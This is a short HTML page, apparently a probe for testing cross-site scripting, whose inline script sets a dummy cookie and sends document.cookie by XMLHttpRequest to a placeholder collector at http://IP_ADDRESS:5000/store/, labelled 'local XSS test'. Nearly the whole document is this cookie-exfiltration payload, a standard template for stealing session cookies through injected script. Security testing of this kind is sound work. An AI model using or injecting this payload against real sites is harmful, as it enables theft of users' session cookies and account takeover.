<html>
  <body>
    This sends the probe to http://IP_ADDRESS:5000.
    <script>
      document.cookie = "info=This is a test cookie"; 
      var xhr = new XMLHttpRequest();
      xhr.open('GET', "http://IP_ADDRESS:5000/store/{'cookies': '" + document.cookie + "', 'desc': 'local XSS test'}");
      xhr.send()
    </script>
  </body>
</html>
